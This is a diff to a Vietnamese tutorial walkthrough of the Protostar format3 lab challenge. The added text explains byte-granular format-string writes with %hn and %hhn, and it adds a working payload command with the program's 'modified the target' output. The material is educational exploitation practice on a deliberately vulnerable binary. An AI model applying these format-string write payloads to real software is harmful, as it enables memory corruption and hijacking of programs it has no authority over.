@@ -161,9 +161,23 @@ python -c "print 'AAAA' + '%x.' * 100"
 
 Mục tiêu hoàn thành!
 
+## Mở rộng cách ghi
+
+Đối với cách ghi dùng `%n` đơn thuần, ta sẽ ghi 4 byte như đã đề cập ở trên.
+Tuy nhiên, chúng ta cũng có thể ghi 1 hoặc 2 byte với `%hhn` và `%hn`.
+Ta cũng có thể ghi 1 byte giá trị 0x00 khi số ký tự in ra bằng 256.
+Lý do là vì nếu số ký tự bằng 256, nó sẽ tương đương với 0x0100, và chúng ta chỉ ghi 1 byte cuối là 0x00.
+Tận dụng overflow để ghi được nhưng giá trị nhỏ một cách linh hoạt.
+Tham khảo cuối bài để xem cách ghi linh hoạt 1 byte, không cần quan tầm thứ tự địa chỉ cần lưu và không gây ảnh hưởng đến cách vị trí khác trên bộ nhớ.
+
 ## Ref
 ```bash
 user@protostar:~$ format3 <<< $(python -c 'print "\xf4\x96\x04\x08" + "\xf5\x96\x04\x08" + "\xf6\x96\x04\x08" + "%56x" + "%12$n" + "%17x" + "%13$n" + "%173x" + "%14$n"')
                                                        0         bffff5b0                                                                                                                                                                     b7fd7ff4
+you have modified the target :)
+```
+```bash
+user@protostar:~$ format3 <<< $(python -c 'print "\xf4\x96\x04\x08" + "\xf5\x96\x04\x08" + "\xf6\x96\x04\x08" + "\xf7\x96\x04\x08" + "%241x" + "%15$hhn" + "%257x" + "%14$hhn" + "%83x" + "%13$hhn" + "%239x" + "%12$hhn"')
+                                                                                                                                                                                                                                                0                                                                                                                                                                                                                                                         bffff5b0                                                                           b7fd7ff4                                                                                                                                                                                                                                              0
 you have modified the target :)
 ```
